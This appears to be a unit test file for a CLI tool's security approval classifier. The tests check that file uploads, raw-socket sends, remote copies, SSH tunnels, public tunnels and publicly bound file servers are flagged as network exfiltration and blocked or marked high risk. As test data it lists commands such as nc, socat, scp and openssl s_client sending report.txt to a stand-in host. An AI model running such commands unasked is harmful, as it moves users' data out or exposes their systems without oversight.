from __future__ import annotations

import unittest

from spark_cli.security.approval import CommandContext, approval_required_for_command


class NetworkAuthorityTests(unittest.TestCase):
    def assert_upload(self, command: list[str]) -> None:
        decision = approval_required_for_command(command, CommandContext(non_interactive=True))
        self.assertTrue(decision.requires_approval, command)
        self.assertEqual(decision.action_class, "network_exfiltration", command)
        self.assertEqual(decision.approval_mode, "blocked", command)

    def assert_read_only(self, command: list[str]) -> None:
        decision = approval_required_for_command(command, CommandContext(non_interactive=True))
        self.assertFalse(decision.requires_approval, command)

    def test_approval_classifier_flags_http_client_uploads(self) -> None:
        for command in (
            ["http", "--form", "POST", "https://example.test/upload", "file@report.txt"],
            ["https", "POST", "https://example.test/upload", "evidence@proof.json"],
            ["Invoke-WebRequest", "-Uri", "https://example.test/upload", "-InFile", "report.txt"],
            ["iwr", "-Uri", "https://example.test/upload", "-InFile:report.txt"],
            ["Invoke-RestMethod", "-Uri", "https://example.test/upload", "-Method", "Put", "-Body", "$payload"],
        ):
            with self.subTest(command=command):
                self.assert_upload(command)

        for command in (
            ["http", "GET", "https://example.test/health"],
            ["http", "POST", "https://example.test/query", "page=1"],
            ["iwr", "-Uri", "https://example.test/download", "-OutFile", "report.txt"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_remote_copy_uploads(self) -> None:
        for command in (
            ["scp", "report.txt", "user@example.test:incoming/report.txt"],
            ["scp", "-r", "dist", "example.test:incoming/dist"],
            ["rsync", "-av", "report.txt", "user@example.test:incoming/report.txt"],
            ["rsync", "-av", "dist", "example.test:incoming/dist"],
        ):
            with self.subTest(command=command):
                self.assert_upload(command)

        for command in (
            ["scp", "user@example.test:incoming/report.txt", "report.txt"],
            ["rsync", "-av", "user@example.test:incoming/report.txt", "report.txt"],
            ["scp", "report.txt", "report-copy.txt"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_ftp_client_upload_forms(self) -> None:
        for command in (
            ["ftp", "-u", "ftp://example.test/incoming/report.txt", "report.txt"],
            ["ftp", "put", "report.txt"],
            ["lftp", "-e", "put report.txt; bye", "ftp://example.test"],
            ["lftp", "mirror", "-R", "dist", "ftp://example.test/dist"],
            ["sftp", "-b", "upload.batch", "user@example.test"],
        ):
            with self.subTest(command=command):
                self.assert_upload(command)

        for command in (
            ["ftp", "ftp://example.test"],
            ["ftp", "ls"],
            ["lftp", "-e", "ls; bye", "ftp://example.test"],
            ["lftp", "mirror", "ftp://example.test/public", "public"],
            ["sftp", "user@example.test"],
            ["sftp", "-h"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_raw_socket_file_uploads(self) -> None:
        for command in (
            ["nc", "example.test", "4444", "<", "report.txt"],
            ["ncat", "--send-only", "example.test", "4444", "<", "report.txt"],
            ["netcat", "example.test", "4444", "<report.txt"],
            ["socat", "-u", "FILE:report.txt", "TCP:example.test:4444"],
            ["socat", "OPEN:report.txt", "SSL:example.test:443"],
        ):
            with self.subTest(command=command):
                self.assert_upload(command)

        for command in (
            ["nc", "-z", "example.test", "443"],
            ["ncat", "--recv-only", "example.test", "4444"],
            ["socat", "-u", "TCP:example.test:4444", "STDOUT"],
            ["socat", "-u", "STDIN", "STDOUT"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_public_file_server_binds(self) -> None:
        for command in (
            ["python", "-m", "http.server", "8000"],
            ["python", "-m", "http.server", "--bind", "0.0.0.0", "8000"],
            ["python3.12", "-m", "http.server", "-b", "::", "8000"],
            ["php", "-S", "0.0.0.0:8000"],
            ["httpd", "-f", "-p", "[::]:8000"],
            ["busybox", "httpd", "-f", "-p", "0.0.0.0:8000"],
        ):
            with self.subTest(command=command):
                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
                self.assertTrue(decision.requires_approval, command)
                self.assertEqual(decision.action_class, "network_exfiltration", command)
                self.assertEqual(decision.risk, "high", command)
                self.assertEqual(decision.confirmation_phrase, "approve public file server", command)

        for command in (
            ["python", "-m", "http.server", "--bind", "127.0.0.1", "8000"],
            ["python", "-m", "http.server", "--bind=localhost", "8000"],
            ["php", "-S", "localhost:8000"],
            ["busybox", "httpd", "-f", "-p", "127.0.0.1:8000"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_openssl_s_client_file_uploads(self) -> None:
        for command in (
            ["openssl", "s_client", "-connect", "example.test:443", "<", "report.txt"],
            ["openssl", "s_client", "-quiet", "-connect", "example.test:443", "<report.txt"],
        ):
            with self.subTest(command=command):
                self.assert_upload(command)

        for command in (
            ["openssl", "s_client", "-connect", "example.test:443"],
            ["openssl", "version"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_ssh_tunnels(self) -> None:
        for command in (
            ["ssh", "-L", "127.0.0.1:8080:127.0.0.1:80", "user@example.test"],
            ["ssh", "-R", "0.0.0.0:8080:127.0.0.1:80", "user@example.test"],
            ["ssh", "-D", "1080", "user@example.test"],
            ["ssh", "-W", "target.example.test:443", "user@example.test"],
            ["ssh", "-L127.0.0.1:8080:127.0.0.1:80", "user@example.test"],
            ["ssh", "-o", "RemoteForward=8080:127.0.0.1:80", "user@example.test"],
        ):
            with self.subTest(command=command):
                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
                self.assertTrue(decision.requires_approval, command)
                self.assertEqual(decision.action_class, "network_exfiltration", command)
                self.assertEqual(decision.risk, "high", command)
                self.assertEqual(decision.confirmation_phrase, "approve ssh tunnel", command)

        for command in (
            ["ssh", "-V"],
            ["ssh", "-G", "-L", "127.0.0.1:8080:127.0.0.1:80", "user@example.test"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_approval_classifier_flags_public_tunnels(self) -> None:
        for command in (
            ["ngrok", "http", "8000"],
            ["ngrok", "tcp", "22"],
            ["ngrok", "start", "demo"],
            ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8000"],
            ["cloudflared", "tunnel", "run", "demo-tunnel"],
            ["lt", "--port", "8000"],
            ["localtunnel", "--port", "8000"],
        ):
            with self.subTest(command=command):
                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
                self.assertTrue(decision.requires_approval, command)
                self.assertEqual(decision.action_class, "network_exfiltration", command)
                self.assertEqual(decision.risk, "high", command)
                self.assertEqual(decision.confirmation_phrase, "approve public tunnel", command)

        for command in (
            ["ngrok", "version"],
            ["ngrok", "--help"],
            ["cloudflared", "version"],
            ["cloudflared", "tunnel", "list"],
            ["localtunnel", "--help"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)


if __name__ == "__main__":
    unittest.main()
